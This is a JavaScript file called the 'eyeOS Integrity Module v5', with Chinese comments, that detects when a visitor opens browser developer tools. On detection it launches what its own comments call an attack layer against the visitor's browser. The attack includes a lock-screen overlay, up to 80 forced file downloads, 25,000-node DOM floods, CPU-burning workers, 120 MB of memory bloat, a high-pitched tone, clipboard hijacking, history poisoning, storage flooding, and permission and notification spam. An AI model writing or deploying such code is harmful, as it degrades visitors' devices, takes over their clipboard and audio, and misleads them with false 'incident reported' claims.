/**
 * eyeOS Integrity Module v5
 *
 * 架构：
 *   [常驻防护] → 右键 / 快捷键 / debugger / iframe
 *   [检测层]   → 窗口尺寸 | console getter | debugger 计时  (OR)
 *   [攻击层]   → 锁屏遮罩 · DOM/Console/Net/Perf/Storage 轰炸 ·
 *                Worker CPU · 内存 · 音频 · 语音 · 剪贴板 · 标题 ·
 *                Favicon · 光标 · History · 权限弹窗 · 通知 · 震动 ·
 *                Elements 搅乱 · 超时自动退出页面
 *   [恢复层]   → stopAttack() 一键复原全部资源；pagehide / beforeunload / visibilitychange 兜底
 */
(function () {
  'use strict';
  if (typeof document === 'undefined' || !document.addEventListener) return;

  /* ══════════════════════════════════════════════
     §1  常驻防护
  ══════════════════════════════════════════════ */
  document.addEventListener('contextmenu', function (e) { e.preventDefault(); }, true);

  document.addEventListener('keydown', function (e) {
    var hit =
      e.key === 'F12' ||
      (e.ctrlKey && e.shiftKey && /^[IJCijc]$/.test(e.key)) ||
      (e.metaKey && e.altKey  && /^[IJCijc]$/.test(e.key)) ||
      ((e.ctrlKey || e.metaKey) && (e.key === 'u' || e.key === 'U')) ||
      ((e.ctrlKey || e.metaKey) && e.key === 's');
    if (hit) { e.preventDefault(); e.stopImmediatePropagation(); }
  }, true);

  var _dbg = (function () { var f = Function('debugger'); return function () { f(); }; })();
  setInterval(_dbg, 1200);

  if (window.top !== window.self) { try { window.top.location = window.self.location; } catch (_) {} }

  /* ══════════════════════════════════════════════
     §2  状态池
  ══════════════════════════════════════════════ */
  var S = {
    open: false,
    timers: [],
    workers: [],
    domJunk: [],
    memPool: [],
    blobUrls: [],
    speechUtts: [],
    audioCtx: null,
    osc: null,
    overlay: null,
    origTitle: document.title,
    origFavicon: null,
    origCursor: '',
    clipHijacked: false,
    floodN: 0,
    titleIdx: 0,
    attackStart: 0,
    mutObs: null,
    cursorStyleEl: null
  };

  /* ══════════════════════════════════════════════
     §3  警告 TXT 内容
  ══════════════════════════════════════════════ */
  var TXT = [
    '\u2554' + '\u2550'.repeat(72) + '\u2557',
    '\u2551' + ' '.repeat(72) + '\u2551',
    '\u2551  ███████╗██╗   ██╗███████╗    ██████╗ ███████╗' + ' '.repeat(25) + '\u2551',
    '\u2551  ██╔════╝╚██╗ ██╔╝██╔════╝   ██╔═══██╗██╔════╝' + ' '.repeat(25) + '\u2551',
    '\u2551  █████╗   ╚████╔╝ █████╗     ██║   ██║███████╗' + ' '.repeat(25) + '\u2551',
    '\u2551  ██╔══╝    ╚██╔╝  ██╔══╝     ██║   ██║╚════██║' + ' '.repeat(25) + '\u2551',
    '\u2551  ███████╗   ██║   ███████╗   ╚██████╔╝███████║██╗' + ' '.repeat(22) + '\u2551',
    '\u2551  ╚══════╝   ╚═╝   ╚══════╝    ╚═════╝ ╚══════╝╚═╝' + ' '.repeat(22) + '\u2551',
    '\u2551' + ' '.repeat(72) + '\u2551',
    '\u2551  INTEGRITY VIOLATION DETECTED' + ' '.repeat(42) + '\u2551',
    '\u2551  No further inspection is permitted.' + ' '.repeat(35) + '\u2551',
    '\u2551  This incident has been logged & reported.' + ' '.repeat(29) + '\u2551',
    '\u2551' + ' '.repeat(72) + '\u2551',
    '\u2551  Contact: jydu_seven@outlook.com' + ' '.repeat(40) + '\u2551',
    '\u2551' + ' '.repeat(72) + '\u2551',
    '\u255a' + '\u2550'.repeat(72) + '\u255d'
  ].join('\n');

  /* ══════════════════════════════════════════════
     §4  攻击模块
  ══════════════════════════════════════════════ */

  /* ── A. TXT 下载 ── */
  function bombTxt() {
    if (S.floodN >= 80) return; S.floodN++;
    try {
      var b = new Blob([TXT + '\n\n--- #' + S.floodN + ' ' + new Date().toISOString() + ' ---\n'], { type: 'application/octet-stream' });
      var u = URL.createObjectURL(b); S.blobUrls.push(u);
      var fr = document.createElement('iframe'); fr.style.display = 'none'; fr.src = u; document.body.appendChild(fr);
      var a = document.createElement('a'); a.href = u; a.download = 'eyeOS_' + Date.now() + '_' + S.floodN + '.txt';
      a.style.display = 'none'; document.body.appendChild(a); a.click();
      setTimeout(function () { try { document.body.removeChild(a); } catch (_) {} try { document.body.removeChild(fr); } catch (_) {} }, 200);
    } catch (_) {}
  }

  /* ── B. Console 洪水 ── */
  function floodConsole() {
    try { console.clear(); } catch (_) {}
    try {
      console.log('%c\u26a0 INTEGRITY VIOLATION', 'font-size:20px;font-weight:bold;color:#ff2222;');
      console.log('%ceyeOS Module v5 \u2014 activity recorded.', 'font-size:13px;color:#bbb;');
      console.log('%cjydu_seven@outlook.com', 'font-size:13px;color:#7B50C2;');
      for (var i = 0; i < 800; i++)
        console.warn('%c[' + ['AUDIT','TRACE','SCAN','HOOK','TRAP'][i%5] + '/' + ['DOM','NET','MEM','SYS','IO','GPU','WK','CSS'][i%8] + '] ' +
          new Date().toISOString() + ' ' + Math.random().toString(36).slice(2,10), 'font-size:10px;color:#444;font-family:monospace;');
    } catch (_) {}
  }

  /* ── C. DOM 海啸（25k 节点 + 每个带子节点和长属性） ── */
  function domFlood() {
    if (S.domJunk.length) return;
    try {
      var f = document.createDocumentFragment();
      for (var i = 0; i < 25000; i++) {
        var d = document.createElement('div');
        d.className = '_e' + Math.random().toString(36).slice(2);
        for (var j = 0; j < 5; j++) d.setAttribute('data-' + j, Math.random().toString(36).repeat(10));
        d.style.cssText = 'position:fixed;left:-99999px;top:-99999px;width:0;height:0;overflow:hidden;pointer-events:none;';
        d.appendChild(document.createElement('span')).textContent = Math.random().toString(36);
        f.appendChild(d); S.domJunk.push(d);
      }
      document.body.appendChild(f);
    } catch (_) {}
  }
  function domClean() {
    for (var i = 0; i < S.domJunk.length; i++) try { S.domJunk[i].remove(); } catch (_) {}
    S.domJunk = [];
  }

  /* ── D. Elements 面板搅乱（MutationObserver + 属性高频翻转） ── */
  function elementsHarass() {
    if (S.mutObs) return;
    var target = document.documentElement;
    var count = 0;
    S.mutObs = new MutationObserver(function () {});
    S.mutObs.observe(target, { attributes: true, childList: true, subtree: true });
    function churn() {
      if (!S.open) return;
      count++;
      target.setAttribute('data-integrity-tick', count + '-' + Math.random().toString(36).slice(2));
      if (S.domJunk.length > 100) {
        var pick = S.domJunk[Math.floor(Math.random() * S.domJunk.length)];
        pick.setAttribute('data-cycle', Math.random().toString(36).repeat(6));
        pick.className = '_e' + Math.random().toString(36).slice(2);
      }
      setTimeout(churn, 60);
    }
    churn();
  }
  function elementsClean() {
    if (S.mutObs) { S.mutObs.disconnect(); S.mutObs = null; }
    try { document.documentElement.removeAttribute('data-integrity-tick'); } catch (_) {}
  }

  /* ── E. Worker CPU（6 个） ── */
  function startWorkers() {
    if (S.workers.length) return;
    var code = 'setInterval(function(){for(var i=0,s=0;i<4e6;i++)s+=Math.sqrt(i)*Math.sin(i)*Math.cos(i);},80);';
    try { for (var i = 0; i < 6; i++) S.workers.push(new Worker(URL.createObjectURL(new Blob([code], { type: 'application/javascript' })))); } catch (_) {}
  }
  function stopWorkers() { for (var i = 0; i < S.workers.length; i++) try { S.workers[i].terminate(); } catch (_) {} S.workers = []; }

  /* ── G. 内存（120 MB） ── */
  function memBloat() { if (S.memPool.length) return; try { for (var i = 0; i < 60; i++) S.memPool.push(new ArrayBuffer(2097152)); } catch (_) {} }
  function memRelease() { S.memPool = []; }

  /* ── H. 标题闪烁 ── */
  var TITLES = ['\u26a0 VIOLATION DETECTED','\u26d4 INTEGRITY ALERT','\ud83d\udea8 eyeOS SECURITY','\u2620 ACCESS DENIED'];
  function titleStrobe() { document.title = TITLES[S.titleIdx++ % TITLES.length]; }
  function titleRestore() { document.title = S.origTitle; S.titleIdx = 0; }

  /* ── I. 剪贴板劫持 + 覆写 ── */
  function clipHandler(e) {
    try { e.clipboardData.setData('text/plain', '\n[eyeOS v5] Inspection prohibited.\njydu_seven@outlook.com\n'); e.preventDefault(); } catch (_) {}
  }
  function clipWrite() { try { navigator.clipboard.writeText('[eyeOS] Clipboard denied.'); } catch (_) {} }
  function clipOn()  { if (S.clipHijacked) return; S.clipHijacked = true; document.addEventListener('copy', clipHandler, true); document.addEventListener('cut', clipHandler, true); }
  function clipOff() { if (!S.clipHijacked) return; S.clipHijacked = false; document.removeEventListener('copy', clipHandler, true); document.removeEventListener('cut', clipHandler, true); }

  /* ── J. 高频蜂鸣 ── */
  function startBeep() {
    try {
      if (S.audioCtx) return;
      var AC = window.AudioContext || window.webkitAudioContext; if (!AC) return;
      S.audioCtx = new AC(); S.osc = S.audioCtx.createOscillator();
      var g = S.audioCtx.createGain(); S.osc.type = 'square'; S.osc.frequency.value = 14800; g.gain.value = 0.07;
      S.osc.connect(g); g.connect(S.audioCtx.destination); S.osc.start();
    } catch (_) {}
  }
  function stopBeep() { try { S.osc && S.osc.stop(); } catch (_) {} try { S.audioCtx && S.audioCtx.close(); } catch (_) {} S.osc = null; S.audioCtx = null; }

  /* ── K. History 污染 ── */
  function historyPoison() {
    try {
      for (var i = 0; i < 100; i++) history.pushState(null, '', location.pathname);
      window.addEventListener('popstate', function g() { if (S.open) history.pushState(null,'',location.pathname); else window.removeEventListener('popstate', g); });
    } catch (_) {}
  }

  /* ── L. Performance 污染 ── */
  function perfFlood() { try { for (var i = 0; i < 3000; i++) performance.mark('__ey_' + i + '_' + Math.random().toString(36).slice(2)); } catch (_) {} }
  function perfClean() { try { performance.clearMarks(); performance.clearMeasures(); performance.clearResourceTimings(); } catch (_) {} }

  /* ── M. Storage 轰炸 ── */
  function storageFlood() { try { var j = Math.random().toString(36).repeat(600); for (var i = 0; i < 300; i++) { localStorage.setItem('__ey_'+i, j); sessionStorage.setItem('__ey_'+i, j); } } catch (_) {} }
  function storageClean() { try { for (var i = 0; i < 300; i++) { localStorage.removeItem('__ey_'+i); sessionStorage.removeItem('__ey_'+i); } } catch (_) {} }

  /* ── N. 语音警告 ── */
  function speakWarn() {
    try { if (!window.speechSynthesis) return; window.speechSynthesis.cancel();
      var u = new SpeechSynthesisUtterance('Warning. Integrity violation. Close developer tools now.');
      u.rate = 0.85; u.pitch = 0.5; u.volume = 0.8; window.speechSynthesis.speak(u);
    } catch (_) {}
  }
  function stopSpeech() { try { window.speechSynthesis && window.speechSynthesis.cancel(); } catch (_) {} }

  /* ── O. 权限弹窗 ── */
  function permSpam() {
    try { navigator.geolocation && navigator.geolocation.getCurrentPosition(function(){},function(){}); } catch (_) {}
    try { Notification && Notification.requestPermission(); } catch (_) {}
    try { navigator.mediaDevices && navigator.mediaDevices.getUserMedia({audio:true}).catch(function(){}); } catch (_) {}
  }

  /* ── P. 通知 ── */
  function notifySpam() {
    try { if (Notification && Notification.permission === 'granted') for (var i = 0; i < 5; i++) new Notification('eyeOS Security', { body: 'Violation #' + Date.now() }); } catch (_) {}
  }

  /* ── Q. Favicon ── */
  function faviconPoison() {
    try { var l = document.querySelector('link[rel*="icon"]'); if (l) { S.origFavicon = l.href; l.href = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"><text y="14" font-size="14">\u26a0</text></svg>'; } } catch (_) {}
  }
  function faviconRestore() { try { if (S.origFavicon) { var l = document.querySelector('link[rel*="icon"]'); if (l) l.href = S.origFavicon; S.origFavicon = null; } } catch (_) {} }

  /* ── R. 警告光标（⚠ SVG，不是 none） ── */
  var CURSOR_SVG = "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='32' height='32'%3E%3Ctext y='24' font-size='22'%3E%E2%9A%A0%EF%B8%8F%3C/text%3E%3C/svg%3E";
  function cursorPoison() {
    try {
      S.origCursor = document.body.style.cursor || '';
      if (!S.cursorStyleEl) { S.cursorStyleEl = document.createElement('style'); document.head.appendChild(S.cursorStyleEl); }
      S.cursorStyleEl.textContent =
        '*, *::before, *::after { cursor: url("' + CURSOR_SVG + '") 2 2, not-allowed !important; }' +
        '#__eyeos_lock, #__eyeos_lock * { cursor: none !important; }';
    } catch (_) {}
  }
  function cursorRestore() {
    try { if (S.cursorStyleEl) { S.cursorStyleEl.textContent = ''; } document.body.style.cursor = S.origCursor; } catch (_) {}
  }

  /* ── S. 震动 ── */
  function vibrateSpam() { try { navigator.vibrate && navigator.vibrate([200,100,200,100,200,100,500]); } catch (_) {} }

  /* ── T. 弹窗 ── */
  function popupSpam() { try { var w = window.open('about:blank','_blank','width=1,height=1,left=9999,top=9999'); if (w) w.close(); } catch (_) {} }

  /* ── U. 超时自动退出页面 ── */
  var TIMEOUT_SEC = 30;
  function checkTimeout() {
    if (!S.open || !S.attackStart) return;
    var elapsed = (Date.now() - S.attackStart) / 1000;
    var remain = Math.max(0, TIMEOUT_SEC - elapsed);
    var cd = S.overlay && S.overlay.querySelector('#__ey_cd');
    if (cd) cd.textContent = Math.ceil(remain) + 's';
    if (remain <= 0) {
      try { window.location.replace('about:blank'); } catch (_) {}
      try { document.documentElement.innerHTML = ''; } catch (_) {}
    }
  }

  /* ── V. 锁屏遮罩（eyeOS 设计语言） ── */
  function showOverlay() {
    if (S.overlay) return;
    var el = document.createElement('div');
    el.id = '__eyeos_lock';
    el.style.cssText =
      'position:fixed;inset:0;z-index:2147483647;' +
      'background:#0D0C10;' +
      'display:flex;flex-direction:column;align-items:center;justify-content:center;' +
      'user-select:none;-webkit-user-select:none;' +
      'font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",sans-serif;' +
      'color:#EAE6E0;text-align:center;overflow:hidden;';

    el.innerHTML =
      /* 背景噪点 */
      '<div style="position:absolute;inset:0;background-image:url(\'data:image/svg+xml,%3Csvg viewBox=%220 0 200 200%22 xmlns=%22http://www.w3.org/2000/svg%22%3E%3Cfilter id=%22n%22%3E%3CfeTurbulence type=%22fractalNoise%22 baseFrequency=%220.9%22/%3E%3C/filter%3E%3Crect width=%22100%25%22 height=%22100%25%22 filter=%22url(%23n)%22/%3E%3C/svg%3E\');opacity:0.03;pointer-events:none;"></div>' +

      /* 角标 */
      '<div style="position:absolute;top:28px;left:28px;display:flex;align-items:center;gap:10px;">' +
        '<div style="width:8px;height:8px;border-radius:50%;background:#ff4444;animation:__ey_pulse 1.5s ease infinite;"></div>' +
        '<span style="font-family:monospace;font-size:10px;letter-spacing:0.14em;text-transform:uppercase;color:#4E4C48;">integrity module v5 active</span>' +
      '</div>' +

      /* 右上：倒计时 */
      '<div style="position:absolute;top:28px;right:28px;font-family:monospace;font-size:11px;color:#4E4C48;letter-spacing:0.1em;">auto-exit in <span id="__ey_cd" style="color:#ff4444;">' + TIMEOUT_SEC + 's</span></div>' +

      /* 主体 */
      '<div style="position:relative;z-index:1;max-width:520px;padding:0 24px;">' +

        /* 图标 */
        '<div style="width:64px;height:64px;margin:0 auto 28px;border-radius:16px;border:1px solid rgba(123,80,194,0.3);' +
          'background:rgba(123,80,194,0.08);display:flex;align-items:center;justify-content:center;">' +
          '<svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#7B50C2" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">' +
            '<path d="M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/>' +
          '</svg>' +
        '</div>' +

        /* 标题 */
        '<div style="font-size:11px;letter-spacing:0.26em;text-transform:uppercase;color:#7B50C2;margin-bottom:14px;font-weight:600;">integrity violation</div>' +

        '<div style="font-size:28px;font-weight:700;letter-spacing:-0.03em;line-height:1.25;margin-bottom:16px;color:#EAE6E0;">Developer Tools<br>Detected</div>' +

        '<div style="font-size:14px;color:#8A8680;line-height:1.7;margin-bottom:32px;">' +
          'Page interaction has been suspended.<br>This incident is logged and reported.' +
        '</div>' +

        /* 退出卡片 */
        '<div style="border:1px solid rgba(255,255,255,0.08);border-radius:14px;padding:22px 32px;background:rgba(255,255,255,0.02);backdrop-filter:blur(8px);-webkit-backdrop-filter:blur(8px);">' +
          '<div style="font-size:10px;letter-spacing:0.2em;text-transform:uppercase;color:#4E4C48;margin-bottom:14px;">close devtools to resume</div>' +
          '<div style="display:flex;justify-content:center;gap:28px;font-size:12px;color:#8A8680;">' +
            '<div><span style="color:#EAE6E0;margin-right:6px;">Mac</span>' +
              '<kbd style="background:#1C1A26;padding:3px 10px;border-radius:6px;font-size:11px;border:1px solid rgba(255,255,255,0.1);font-family:monospace;">&#8984; &#8997; I</kbd>' +
            '</div>' +
            '<div><span style="color:#EAE6E0;margin-right:6px;">Win</span>' +
              '<kbd style="background:#1C1A26;padding:3px 10px;border-radius:6px;font-size:11px;border:1px solid rgba(255,255,255,0.1);font-family:monospace;">F12</kbd>' +
            '</div>' +
          '</div>' +
        '</div>' +

        /* 底线 */
        '<div style="margin-top:28px;display:flex;align-items:center;justify-content:center;gap:10px;">' +
          '<div style="width:20px;height:1px;background:rgba(123,80,194,0.4);"></div>' +
          '<span style="font-size:10px;letter-spacing:0.14em;color:#4E4C48;font-family:monospace;">jydu_seven@outlook.com</span>' +
          '<div style="width:20px;height:1px;background:rgba(123,80,194,0.4);"></div>' +
        '</div>' +

      '</div>' +

      /* 脉冲动画 */
      '<style>' +
        '@keyframes __ey_pulse{0%,100%{opacity:1}50%{opacity:0.3}}' +
      '</style>';

    var block = function (e) { e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation(); };
    ['contextmenu','selectstart','mousedown','mouseup','click','dblclick','auxclick',
     'touchstart','touchmove','touchend','wheel','scroll','drag','dragstart','keydown','keyup','keypress'].forEach(function (ev) {
      el.addEventListener(ev, block, true);
    });
    el.tabIndex = -1;
    document.body.appendChild(el);
    el.focus();
    try { el.requestPointerLock(); } catch (_) {}
    S.overlay = el;
  }
  function hideOverlay() {
    if (!S.overlay) return;
    try { document.exitPointerLock(); } catch (_) {}
    try { S.overlay.remove(); } catch (_) {}
    S.overlay = null;
  }

  /* ══════════════════════════════════════════════
     §5  总控
  ══════════════════════════════════════════════ */
  function startAttack() {
    S.attackStart = Date.now();

    showOverlay();
    floodConsole();
    historyPoison();
    bombTxt();
    domFlood();
    elementsHarass();
    memBloat();
    startWorkers();
    clipOn();
    startBeep();
    storageFlood();
    perfFlood();
    speakWarn();
    permSpam();
    notifySpam();
    faviconPoison();
    cursorPoison();
    vibrateSpam();
    popupSpam();

    S.timers.push(setInterval(bombTxt, 800));
    S.timers.push(setInterval(floodConsole, 2500));
    S.timers.push(setInterval(titleStrobe, 350));
    S.timers.push(setInterval(perfFlood, 4000));
    S.timers.push(setInterval(storageFlood, 5000));
    S.timers.push(setInterval(clipWrite, 2000));
    S.timers.push(setInterval(speakWarn, 15000));
    S.timers.push(setInterval(notifySpam, 6000));
    S.timers.push(setInterval(vibrateSpam, 3000));
    S.timers.push(setInterval(popupSpam, 8000));
    S.timers.push(setInterval(checkTimeout, 1000));
  }

  function stopAttack() {
    for (var i = 0; i < S.timers.length; i++) clearInterval(S.timers[i]);
    S.timers = [];
    S.floodN = 0;
    S.attackStart = 0;
    hideOverlay();
    elementsClean();
    stopWorkers();
    domClean();
    memRelease();
    for (var i = 0; i < S.blobUrls.length; i++) try { URL.revokeObjectURL(S.blobUrls[i]); } catch (_) {}
    S.blobUrls = [];
    clipOff();
    stopBeep();
    stopSpeech();
    titleRestore();
    storageClean();
    perfClean();
    faviconRestore();
    cursorRestore();
    try { navigator.vibrate && navigator.vibrate(0); } catch (_) {}
    try { console.clear(); } catch (_) {}
  }

  /* ══════════════════════════════════════════════
     §6  检测层（基线校准 + 多方法投票）
  ══════════════════════════════════════════════ */

  /*
   * 方法 A：窗口尺寸突变
   * 记住加载时的 outerSize - innerSize 作为基线，
   * 只有差值相比基线增长 > 120px 才判定（排除 Safari 浏览器 chrome 的固定占用）
   */
  var _baseW = window.outerWidth  - window.innerWidth;
  var _baseH = window.outerHeight - window.innerHeight;
  window.addEventListener('resize', function () {
    if (!S.open) {
      var dw = window.outerWidth  - window.innerWidth;
      var dh = window.outerHeight - window.innerHeight;
      if (dw < _baseW + 40) _baseW = Math.min(_baseW, dw);
      if (dh < _baseH + 40) _baseH = Math.min(_baseH, dh);
    }
  });
  function checkBySize() {
    var dw = window.outerWidth  - window.innerWidth  - _baseW;
    var dh = window.outerHeight - window.innerHeight - _baseH;
    return dw > 120 || dh > 120;
  }

  /*
   * 方法 B：console getter
   * 用 RegExp.toString 重写检测（比 DOM id getter 在 Safari 上更稳定）
   */
  var _consoleHit = false;
  function checkByConsole() {
    _consoleHit = false;
    var re = /./;
    re.toString = function () { _consoleHit = true; return ''; };
    try { console.log('%c', re); } catch (_) {}
    try { console.clear(); } catch (_) {}
    return _consoleHit;
  }

  /* 方法 C：debugger 计时 */
  function checkByDebugger() {
    var t = performance.now(); _dbg(); return (performance.now() - t) > 80;
  }

  /*
   * 投票逻辑：至少 2/3 命中才触发，防止单一方法误报
   * 连续 2 轮判定一致才改变状态（消抖）
   */
  var _hitStreak = 0;
  var _missStreak = 0;
  function detect() {
    var score = (checkBySize() ? 1 : 0) + (checkByConsole() ? 1 : 0) + (checkByDebugger() ? 1 : 0);
    if (score >= 2) {
      _missStreak = 0;
      _hitStreak++;
      if (_hitStreak >= 2 && !S.open) { S.open = true; startAttack(); }
    } else {
      _hitStreak = 0;
      _missStreak++;
      if (_missStreak >= 2 && S.open) { S.open = false; stopAttack(); }
    }
  }
  setInterval(detect, 800);

  /* ══════════════════════════════════════════════
     §7  兜底清理
  ══════════════════════════════════════════════ */
  function bail() { if (!S.open) return; S.open = false; stopAttack(); }
  window.addEventListener('pagehide', bail);
  window.addEventListener('beforeunload', bail);
  document.addEventListener('visibilitychange', function () { if (document.visibilityState === 'hidden' && S.open) bail(); });

  /* ══════════════════════════════════════════════
     §8  初始控制台蜜罐
  ══════════════════════════════════════════════ */
  try { console.clear(); } catch (_) {}
  try {
    console.log('%c\ud83d\udc41 eyeOS', 'font-size:24px;font-weight:800;color:#7B50C2;font-family:system-ui;');
    console.log('%cProtected \xb7 Integrity Module v5', 'font-size:11px;color:#555;font-family:monospace;');
  } catch (_) {}
})();
